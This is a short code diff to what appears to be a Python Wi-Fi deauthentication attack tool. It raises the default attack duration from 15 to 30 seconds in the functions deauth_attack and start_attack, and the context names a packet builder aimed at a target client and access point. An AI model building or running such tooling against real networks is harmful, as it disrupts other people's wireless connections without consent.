@@ -33,7 +33,7 @@ def create_deauth_packet(target_mac, ap_bssid, reason_code=7):
     
     return pkt_to_client, pkt_to_ap
 
-def deauth_attack(target_mac, ap_bssid, interface, attack_duration=15):
+def deauth_attack(target_mac, ap_bssid, interface, attack_duration=30):
     """
     Perform targeted deauth attack - improved version
     Args:
@@ -78,7 +78,7 @@ def deauth_attack(target_mac, ap_bssid, interface, attack_duration=15):
     
     print(f"\n[COMPLETE] Deauth attack finished. Sent {packets_sent} packets")
 
-def start_attack(target_mac, ap_bssid, interface, attack_duration=15):
+def start_attack(target_mac, ap_bssid, interface, attack_duration=30):
     """
     Start deauth attack in separate thread
     Args:
